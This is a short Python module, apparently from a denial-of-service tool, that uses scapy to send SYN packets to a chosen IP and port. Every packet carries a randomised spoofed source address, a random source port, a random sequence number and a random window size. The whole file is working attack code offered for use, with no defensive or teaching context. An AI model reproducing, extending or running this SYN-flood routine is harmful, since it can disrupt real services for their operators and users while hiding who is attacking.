# Import modules
import random
from scapy.all import IP, TCP, send
import tools.randomData as randomData
from colorama import Fore


def flood(target: tuple[str, int]) -> None:
    """Send SYN packets to target.
    
    Args:
        target: Tuple of (ip_address, port)
    """
    ip_packet = IP()
    ip_packet.src = randomData.random_IP()
    ip_packet.dst = target[0]

    tcp_packet = TCP()
    tcp_packet.sport = random.randint(1000, 10000)
    tcp_packet.dport = target[1]
    tcp_packet.flags = "S"
    tcp_packet.seq = random.randint(1000, 10000)
    tcp_packet.window = random.randint(1000, 10000)

    for _ in range(16):
        try:
            send(ip_packet / tcp_packet, verbose=False)
        except PermissionError:
            print(
                f"{Fore.RED}[!] {Fore.MAGENTA}Permission denied. Run as administrator/root.{Fore.RESET}"
            )
            break
        except OSError as e:
            print(
                f"{Fore.RED}[!] {Fore.MAGENTA}Network error while sending SYN: {e}{Fore.RESET}"
            )
        else:
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}SYN packet sent to {target[0]}:{target[1]}.{Fore.RESET}"
            )
